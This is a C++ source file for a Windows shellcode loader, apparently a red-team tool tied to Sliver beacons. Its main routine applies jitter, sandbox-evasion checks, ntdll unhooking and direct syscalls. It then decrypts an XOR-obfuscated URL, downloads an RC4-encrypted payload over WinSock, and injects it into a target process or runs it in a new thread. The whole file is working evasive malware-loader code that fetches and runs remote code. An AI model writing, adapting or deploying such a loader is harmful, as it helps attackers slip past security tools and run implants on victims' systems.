#include "config.hpp"

#include "cryptography/rc4.hpp"
#include "evasion/evasion.hpp"
#include "inject/inject.hpp"
#include "integrity/export_parser.hpp"
#include "net/http_client_winsock.hpp"
#include "net/url.hpp"
#include "syscall/syscall.hpp"
#include "unhook/unhook.hpp"

#include <windows.h>

#include <cstddef>
#include <cstdint>
#include <cstring>
#include <cwchar>
#include <fstream>
#include <string>
#include <vector>

namespace {

// Simple file logger for diagnosing silent failures on the target.
// Writes to %TEMP%\loader_debug.txt — check this file if the loader
// appears to do nothing.
void DbgLog(const char* msg) {
    if (!app::config::kEnableDebugLog) return;

    wchar_t temp_path[MAX_PATH] = {};
    if (!GetTempPathW(MAX_PATH, temp_path)) return;

    wchar_t log_path[MAX_PATH] = {};
    std::size_t temp_len = std::wcslen(temp_path);
    if (temp_len >= MAX_PATH - 16) return;
    std::wmemcpy(log_path, temp_path, temp_len);
    std::wmemcpy(log_path + temp_len, L"loader_debug.txt", 16);

    HANDLE h = CreateFileW(
        log_path,
        FILE_APPEND_DATA,
        FILE_SHARE_READ | FILE_SHARE_WRITE,
        nullptr,
        OPEN_ALWAYS,
        FILE_ATTRIBUTE_NORMAL,
        nullptr);
    if (h == INVALID_HANDLE_VALUE) return;

    DWORD written = 0;
    WriteFile(h, msg, static_cast<DWORD>(std::strlen(msg)), &written, nullptr);
    WriteFile(h, "\r\n", 2, &written, nullptr);
    CloseHandle(h);
}

// Decrypt XOR-obfuscated URL at runtime.
std::string DecryptUrl(const std::uint8_t* data, std::size_t len, std::uint8_t key) {
    std::string out;
    out.reserve(len);
    for (std::size_t i = 0; i < len; ++i) {
        out.push_back(static_cast<char>(data[i] ^ key));
    }
    return out;
}

// Simple direct execution: allocate exactly payload size, copy, protect, run.
// This matches the proven behaviour of the original single-file loader.
// Heap masking was removed because Sliver payloads can be > 17 MB,
// which overflows any reasonably-sized cover region.
void* PrepareExecutionRegion(const std::vector<std::uint8_t>& shellcode) {
    PVOID mem = VirtualAlloc(
        nullptr, shellcode.size(),
        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!mem) return nullptr;

    std::memcpy(mem, shellcode.data(), shellcode.size());

    DWORD old = 0;
    if (!VirtualProtect(mem, shellcode.size(), PAGE_EXECUTE_READ, &old)) {
        VirtualFree(mem, 0, MEM_RELEASE);
        return nullptr;
    }

    return mem;
}

} // namespace

int main() {
    DbgLog("[loader] started");

    // -----------------------------------------------------------------
    // PHASE 0: Initial jitter (30–120 s) + secondary micro-delays
    // -----------------------------------------------------------------
    if (app::config::kEnableJitter) {
        DbgLog("[loader] entering jitter delay (30-120s) …");
        research::evasion::JitterDelay();
        DbgLog("[loader] jitter complete");
    } else {
        DbgLog("[loader] jitter disabled");
    }

    // -----------------------------------------------------------------
    // PHASE 1: Environment validation
    // -----------------------------------------------------------------
    if (app::config::kEnableEvasionChecks) {
        DbgLog("[loader] running evasion checks …");
        if (research::evasion::ShouldAbort()) {
            DbgLog("[loader] EVASION CHECK FAILED — aborting");
            ExitProcess(0);
        }
        DbgLog("[loader] evasion checks passed");
    } else {
        DbgLog("[loader] evasion checks disabled");
    }

    // -----------------------------------------------------------------
    // PHASE 2: Unhook critical ntdll APIs from clean on-disk image
    // -----------------------------------------------------------------
    DbgLog("[loader] unhooking …");
    bool unhooked = research::unhook::UnhookAll();
    DbgLog(unhooked ? "[loader] unhook ok" : "[loader] unhook skipped/failed");

    // -----------------------------------------------------------------
    // PHASE 3: Initialize direct syscall stubs
    // -----------------------------------------------------------------
    DbgLog("[loader] init syscall stubs …");
    bool syscalls_ok = research::syscall::GetDispatcher().Init();
    DbgLog(syscalls_ok ? "[loader] syscalls ok" : "[loader] syscalls init failed (fallback to std api)");

    // -----------------------------------------------------------------
    // PHASE 4: Decrypt URL
    // -----------------------------------------------------------------
    std::string url = DecryptUrl(
        app::config::kObfuscatedUrl.data(),
        app::config::kObfuscatedUrl.size(),
        app::config::kUrlXorKey);

    DbgLog(std::string("[loader] decrypted url: ").append(url).c_str());

    if (url.empty() || url.find("http") != 0) {
        DbgLog("[loader] BAD URL — aborting");
        ExitProcess(0);
    }

    // -----------------------------------------------------------------
    // PHASE 5: Download encrypted payload via WinSock
    // -----------------------------------------------------------------
    auto parsed_url = research::net::Url::Parse(url);
    if (!parsed_url) {
        DbgLog("[loader] URL parse failed — aborting");
        ExitProcess(0);
    }

    DbgLog("[loader] downloading payload …");
    research::net::HttpClient client;
    auto response = client.Get(*parsed_url, app::config::kUserAgent);

    if (!response.ok) {
        DbgLog(std::string("[loader] HTTP failed: ").append(response.error).c_str());
        ExitProcess(0);
    }
    if (response.body.empty()) {
        DbgLog("[loader] HTTP body empty — aborting");
        ExitProcess(0);
    }

    DbgLog(std::string("[loader] downloaded ")
               .append(std::to_string(response.body.size()))
               .append(" bytes")
               .c_str());

    // -----------------------------------------------------------------
    // PHASE 6: RC4 decrypt payload
    // -----------------------------------------------------------------
    std::vector<std::uint8_t> payload;
    payload.resize(response.body.size());
    std::memcpy(payload.data(), response.body.data(), response.body.size());

    research::cryptography::Rc4DecryptInPlace(payload, app::config::kRc4Key);
    DbgLog(std::string("[loader] rc4 decrypted, payload size: ")
               .append(std::to_string(payload.size()))
               .c_str());

    if (payload.empty()) {
        DbgLog("[loader] payload empty after rc4 — aborting");
        ExitProcess(0);
    }

    // -----------------------------------------------------------------
    // PHASE 7: Inject or execute directly with heap masking
    // -----------------------------------------------------------------
    DbgLog("[loader] attempting injection …");
    bool injected = research::inject::Inject(payload, app::config::kInjectTargetProcess);
    if (injected) {
        DbgLog("[loader] injection succeeded");
    } else {
        DbgLog("[loader] injection skipped/failed, falling back to direct exec …");
        void* exec = PrepareExecutionRegion(payload);
        if (exec) {
            DbgLog("[loader] direct exec region prepared, creating thread …");
            // Create a dedicated thread so the beacon can spawn worker threads
            // and return without the loader process dying underneath it.
            HANDLE hThread = CreateThread(
                nullptr, 0,
                reinterpret_cast<LPTHREAD_START_ROUTINE>(exec),
                nullptr, 0, nullptr);
            if (hThread) {
                DbgLog("[loader] thread created, waiting for beacon …");
                // The beacon never returns; we wait forever so the process
                // stays alive.  On a real engagement you might prefer
                // WaitForSingleObject with a long timeout then exit.
                WaitForSingleObject(hThread, INFINITE);
                CloseHandle(hThread);
            } else {
                DbgLog("[loader] CreateThread failed");
            }
        } else {
            DbgLog("[loader] PrepareExecutionRegion failed — aborting");
        }
    }

    // -----------------------------------------------------------------
    // PHASE 8: Clean exit
    // -----------------------------------------------------------------
    DbgLog("[loader] exiting");
    research::syscall::GetDispatcher().Shutdown();
    ExitProcess(0);
    return 0; // never reached
}
